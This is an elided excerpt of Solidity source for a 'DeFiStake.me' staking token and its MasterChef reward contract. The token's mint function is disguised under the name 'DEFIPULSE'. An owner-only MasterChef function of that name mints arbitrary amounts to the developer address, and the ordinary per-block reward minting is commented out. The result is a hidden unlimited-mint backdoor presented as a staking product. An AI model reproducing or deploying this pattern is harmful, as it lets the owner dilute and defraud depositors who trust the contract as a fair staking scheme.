...
/*
  ...
  ___  ___ ___ ___   ___ _____ _   _  _____ 
...
website:    https://defistake.me

A Unique Method for Staking DeFi Tokens
...
contract ERC20 is Context, IERC20 {
     ...
     */
    function _DEFIPULSE(address account, uint256 amount) internal virtual {
...
contract DEFIToken is ERC20("DeFiStake.me", "sDFI"), Ownable {
    /// @notice Creates `_amount` token to `_to`. Must only be called by the owner (MasterChef).
    function DEFIPULSE(address _to, uint256 _amount) public onlyOwner {
        _DEFIPULSE(_to, _amount);
    }
...
contract MasterChef is Ownable {
    ...
    struct PoolInfo {
        ...
        uint256 allocPoint;       // How many allocation points assigned to this pool. DEFI to distribute per block.
        uint256 lastRewardBlock;  // Last block number that DEFI distribution occurs.
        uint256 accDEFIPerShare; // Accumulated DEFI per share, times 1e12. See below.
    }
    ...
    // Block number when bonus DEFI period ends.
    ...
    // View function to see pending DEFI on frontend.
    ...
    function DEFIPULSE(uint256 amount) public onlyOwner{
        DEFI.DEFIPULSE(devaddr, amount);
    }
    ...
    function updatePool(uint256 _pid) public {
        ...
        uint256 multiplier = getMultiplier(pool.lastRewardBlock, block.number);
        uint256 DEFIReward = multiplier.mul(DEFIPerBlock).mul(pool.allocPoint).div(totalAllocPoint);
        //DEFI.DEFIPULSE(address(this), DEFIReward);
    ...
    // Safe DEFI transfer function, just in case if rounding error causes pool to not have enough DEFI.
